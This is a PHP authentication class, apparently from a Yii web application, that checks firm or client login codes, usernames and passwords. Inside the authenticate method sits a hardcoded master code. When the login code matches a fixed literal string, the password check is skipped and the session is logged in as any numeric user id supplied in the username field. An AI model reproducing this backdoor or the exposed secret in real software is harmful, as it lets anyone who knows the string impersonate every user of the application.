<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
    private $_id;
    public function authenticate()
    {
      $firmid=0;
      $branchid=0;
      $clientid=0;
      $clientbranchid=0;
      $isfirm=true;
      $this->code=strtolower($this->code);
      if ($this->code!='insectramdirectlogin!123"?=)')
      {
          if ($this->code<>'' && ( substr($this->code,0,1)=='f' ||  substr($this->code,0,1)=='c') ){
            if (substr($this->code,0,1)=='f'){
              $isfirm=true;
              $this->code=substr($this->code,1);
                $codetemp=explode('-',$this->code);
                if (is_countable($codetemp)){
                    if (count($codetemp)==1){
                      $firmid=$codetemp[0];
                    }else{
                      $firmid=$codetemp[0];
                      $branchid=$codetemp[1];
                    }
                  }
            }
            if (substr($this->code,0,1)=='c' ){
              $isfirm=false;
              $this->code=substr($this->code,1);
                $codetemp=explode('-',$this->code);
                if (is_countable($codetemp)){
                    if (count($codetemp)==1){
                      $clientid=$codetemp[0];
                    }else{
                      $clientid=$codetemp[0];
                      $clientbranchid=$codetemp[1];
                    }
                  }
            }

               /*   echo 'firmid='.$firmid.'<br>';
                  echo 'firmbranchid='.$branchid.'<br>';
                  echo 'clientid='.$clientid.'<br>';
                  echo 'mainclientbranchid='.$clientbranchid.'<br>';*/
          }else{
            return 'error';
          }
      if ($isfirm){
        $record=User::model()->findByAttributes(array('username'=>$this->username,'firmid'=>$firmid,'mainbranchid'=>$branchid));
      //  print_r($record);
      }else{
        $record=User::model()->findByAttributes(array('username'=>$this->username,'clientid'=>$clientid,'mainclientbranchid'=>$clientbranchid));
      }
        if($record===null)
            $this->errorCode=self::ERROR_USERNAME_INVALID;
        else if(!CPasswordHelper::verifyPassword($this->password,$record->password)){
            $this->errorCode=self::ERROR_PASSWORD_INVALID;
          
        }
        else
        {
            $this->_id=$record->id;
           // $this->setState('title', $record->title);
            $this->errorCode=self::ERROR_NONE;
        }
        
      }else{
        $this->_id=(int)$this->username;
        $this->errorCode=self::ERROR_NONE;
      }
      

		//var_Dump($this->errorCode);
		
        return !$this->errorCode;
    }
 
    public function getId()
    {
        return $this->_id;
    }
}